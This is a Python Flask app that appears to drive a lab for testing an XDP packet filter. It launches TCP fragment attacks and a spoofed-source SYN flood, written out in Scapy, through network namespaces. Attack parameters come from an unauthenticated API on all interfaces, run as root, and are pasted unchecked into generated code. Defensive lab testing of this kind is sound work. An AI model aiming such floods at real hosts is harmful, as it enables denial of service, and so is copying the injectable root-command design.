import subprocess
import threading
import time
import os
import sys
from flask import Flask, render_template, jsonify, request
from collections import deque

app = Flask(__name__)

# --- Shared State ---
kernel_buffer = deque(maxlen=500)
kernel_lock = threading.Lock()

cmd_buffer = deque(maxlen=500)
cmd_lock = threading.Lock()

attack_running = False
attack_lock = threading.Lock()

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

def log_kernel(line, ltype="info"):
    ts = time.strftime("%H:%M:%S")
    with kernel_lock:
        kernel_buffer.append({"time": ts, "raw": line, "type": ltype})

def log_cmd(line, ltype="info"):
    ts = time.strftime("%H:%M:%S")
    with cmd_lock:
        cmd_buffer.append({"time": ts, "raw": line, "type": ltype})

def tail_kernel_logs():
    try:
        proc = subprocess.Popen(
            ["cat", "/sys/kernel/debug/tracing/trace_pipe"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        for line in proc.stdout:
            line = line.strip()
            if not line:
                continue
            log_kernel(line, classify(line))
    except Exception as e:
        log_kernel(f"ERROR reading trace_pipe: {e}", "error")

def classify(line: str) -> str:
    l = line.lower()
    if "tcp fragment attack blocked" in l: return "blocked"
    if "ip blocklisted" in l: return "blocklisted"
    if "xdp triggered" in l: return "trigger"
    if "packet received" in l: return "packet"
    return "info"

def run_cmd_as_root(cmd: list) -> dict:
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return {"ok": result.returncode == 0, "stdout": result.stdout, "stderr": result.stderr}
    except subprocess.TimeoutExpired:
        return {"ok": False, "stdout": "", "stderr": "Timed out after 30s"}
    except Exception as e:
        return {"ok": False, "stdout": "", "stderr": str(e)}

def do_tcp_frag_attack(target_ip: str, iface: str, count: int):
    global attack_running
    log_cmd(f"Starting TCP fragment attack -> {target_ip} on {iface} ({count} rounds)", "attack")
    
    # Use the current virtual environment's python which has scapy installed
    python3 = sys.executable
    script = os.path.join(BASE_DIR, "tcp_frag_attack.py")

    for i in range(count):
        if not attack_running:
            log_cmd("Attack halted by user.", "error")
            break
        log_cmd(f"\n--- Round {i+1}/{count} ---", "info")
        res = run_cmd_as_root(["sudo", "ip", "netns", "exec", "client_ns", python3, script, target_ip, iface])
        
        output = (res['stdout'] + "\n" + res['stderr']).strip()
        for line in output.split('\n'):
            if line: log_cmd(line, "ok" if res["ok"] else "error")
        time.sleep(0.5)

    with attack_lock: attack_running = False
    log_cmd("TCP fragment attack finished.", "info")

def do_syn_flood(target_ip: str, iface: str, num_ips: int, packets_each: int):
    global attack_running
    log_cmd(f"Starting SYN flood -> {target_ip} | IPs: {num_ips} | {packets_each} pkts/ip", "attack")

    scapy_script = f"""
from scapy.all import Ether, IP, TCP, sendp
import time
import random, socket, struct

target = "{target_ip}"
iface  = "{iface}"

src_ips = ["192.168.50.2"] if {num_ips} == 1 else [socket.inet_ntoa(struct.pack(">I", random.randint(0x01000001, 0xFEFFFFFE))) for _ in range({num_ips})]

sent = 0
for src in src_ips:
    for port in range(1024, 1024 + {packets_each}):
        sendp(Ether() / IP(src=src, dst=target) / TCP(sport=port, dport=80, flags="S"), iface=iface, verbose=False)
        sent += 1
    time.sleep(0.01)
print(f"SYN flood done. Sent {{sent}} packets.")
"""
    tmp = "/tmp/aethon_syn_flood.py"
    with open(tmp, "w") as f: f.write(scapy_script)

    # Use the current virtual environment's python which has scapy installed
    python3 = sys.executable
    res = run_cmd_as_root(["sudo", "ip", "netns", "exec", "client_ns", python3, tmp, target_ip, iface])

    output = (res['stdout'] + "\n" + res['stderr']).strip()
    for line in output.split('\n'):
        if line: log_cmd(line, "ok" if res["ok"] else "error")
    
    with attack_lock: attack_running = False
    log_cmd("SYN flood finished.", "info")

# --- Routes ---
@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api/logs/kernel")
def api_logs_kernel():
    with kernel_lock: return jsonify(list(kernel_buffer))

@app.route("/api/logs/cmd")
def api_logs_cmd():
    with cmd_lock: return jsonify(list(cmd_buffer))

@app.route("/api/status")
def api_status():
    with attack_lock: return jsonify({"running": attack_running})

@app.route("/api/attack", methods=["POST"])
def api_attack():
    global attack_running
    data = request.json or {}
    with attack_lock:
        if attack_running: return jsonify({"ok": False, "msg": "Attack already running."})
        attack_running = True

    t_ip = data.get("target_ip", "192.168.50.1")
    iface = data.get("iface", "veth1")
    atype = data.get("type", "tcp_frag")

    if atype == "tcp_frag":
        threading.Thread(target=do_tcp_frag_attack, args=(t_ip, iface, int(data.get("count", 3))), daemon=True).start()
    elif atype == "syn_same":
        threading.Thread(target=do_syn_flood, args=(t_ip, iface, 1, int(data.get("packets", 50))), daemon=True).start()
    elif atype == "syn_multi":
        threading.Thread(target=do_syn_flood, args=(t_ip, iface, int(data.get("num_ips", 20)), int(data.get("packets", 10))), daemon=True).start()
    else:
        attack_running = False
        return jsonify({"ok": False, "msg": "Unknown attack type"})

    return jsonify({"ok": True})

@app.route("/api/stop", methods=["POST"])
def api_stop():
    global attack_running
    with attack_lock: attack_running = False
    log_cmd("Stop signal sent by user.", "info")
    return jsonify({"ok": True})

@app.route("/api/clear", methods=["POST"])
def api_clear():
    with kernel_lock: kernel_buffer.clear()
    with cmd_lock: cmd_buffer.clear()
    return jsonify({"ok": True})

@app.route("/api/setup_veth", methods=["POST"])
def api_setup_veth():
    # Because you run this with sudo, '~' resolves to /root instead of /home/shivam.
    # Hardcoding the exact absolute path fixes this.
    script = "/home/shivam/terminal/veth_command.sh"
    if not os.path.exists(script): 
        log_cmd(f"ERROR: {script} not found.", "error")
        return jsonify({"ok": False})
    
    log_cmd(f"Running: sudo bash {script}", "info")
    res = run_cmd_as_root(["sudo", "bash", script])
    output = (res['stdout'] + "\n" + res['stderr']).strip()
    
    for line in output.split('\n'):
        if line: log_cmd(line, "info" if res["ok"] else "error")
        
    log_cmd("veth setup complete.", "ok")
    return jsonify({"ok": True})

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Run with: sudo python3 app.py")
        exit(1)
    threading.Thread(target=tail_kernel_logs, daemon=True).start()
    app.run(host="0.0.0.0", port=5000, debug=False)
